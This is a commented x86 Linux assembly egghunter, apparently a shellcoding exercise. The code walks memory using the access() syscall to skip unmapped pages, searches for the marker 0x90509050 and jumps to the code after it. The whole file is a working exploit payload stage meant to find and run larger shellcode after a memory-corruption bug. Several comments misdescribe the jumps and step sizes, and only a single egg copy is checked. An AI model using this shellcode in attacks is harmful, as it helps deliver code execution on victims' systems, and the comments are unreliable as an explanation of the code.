global _start

section .text

_start:
        xor ecx, ecx
        mul ecx			; Trick to clean ecx, eax, edx
        cld			; Clear the direction flag

align_page:
        or dx,0xfff		; Page alignment operation on the current pointer and then incrementing edx by one.
				; This operation is equivalent to adding 0x1000 to the value in edx

next_addr:
        inc edx
        lea ebx, [edx+0x4]	; Try to access edx+4 bytes (if that works, edx+0 will work, too!)
				; ebx (address)
				; ecx (mode) = 0
        push byte 0x21		; syscall access()
        pop eax
        int 0x80

        cmp al, 0xf2		; check for EFAULT
        jz align_page		; pointing outside of the accessible address space
				; jumping back to next_addr and trying +0x1000 bytes

        mov eax,0x90509051	; The egg key is 0x90509050, but its going to be set as 0x90509051 (for now)
	dec eax			; Dec eax to set it as 0x90509050 (key)
	mov edi, edx
	scasd			; By initializing edi to the pointer value that is currently in edi, the scasd
				; instruction can be used to compare the contents of the memory stored in edi to
				; the dword value that is currently in eax.

        jnz next_addr		; edi and eax are different, jumping back to next_addr and trying +0x1000 bytes
				; If edi and eax are equal, the egg was found and the code will jump to edi
        jmp edi


